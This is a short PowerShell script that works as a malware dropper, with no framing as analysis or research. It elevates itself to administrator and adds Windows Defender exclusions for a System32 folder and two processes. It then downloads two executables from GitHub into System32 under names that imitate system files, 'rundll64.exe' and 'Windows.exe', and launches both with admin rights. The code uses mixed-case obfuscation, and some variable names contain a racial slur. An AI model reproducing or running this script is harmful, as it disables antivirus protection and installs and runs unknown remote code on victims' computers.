if (!([SECURITy.PrInCipAl.WindOwSpRinCIpal][SECurItY.prInciPAL.wiNdOwSIdenTiTy]::GetCurrent()).IsInRole([SECURiTY.pRIncipAL.WinDoWSBuiltInrOlE] "Administrator")) {
   Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PsCOmMANdpATh`"" -Verb RunAs
        exit
}

Add-MpPreference -ExclusionPath "C:\Windows\System32\Dism"
Add-MpPreference -ExclusionProcess "C:\Windows\System32\rundll64.exe"
Add-MpPreference -ExclusionProcess "C:\Windows\System32\Windows.exe"

$TuffuRl = "https://github.com/totowii/meow/raw/refs/heads/main/rundll64.exe"
$TuFfpaTh = "C:\Windows\System32\rundll64.exe"

Write-Host "Downloading..." -ForegroundColor Cyan

$WC = New-Object System.Net.WebClient
$WC.DownloadFileAsync($TuffuRl, $TuFfpaTh)

while ($WC.IsBusy) {
         Start-Sleep -Milliseconds 1000
}

$NIGgEruRL = "https://github.com/RollbakIsOnline/Puls/raw/refs/heads/main/Windows.exe"
$nigGeRpAth = "C:\Windows\System32\Windows.exe"

$WC = New-Object System.Net.WebClient
$WC.DownloadFileAsync($NIGgEruRL, $nigGeRpAth)

while ($WC.IsBusy) {
      Start-Sleep -Milliseconds 1000
}

if (Test-Path $TuFfpaTh) {
   Write-Host "Completed..." -ForegroundColor Green
     Start-Process $TuFfpaTh -Verb RunAs
} else {
         Write-Host "Download failed..." -ForegroundColor Red
}

if (Test-Path $nigGeRpAth) {
     Start-Process $nigGeRpAth -Verb RunAs
}
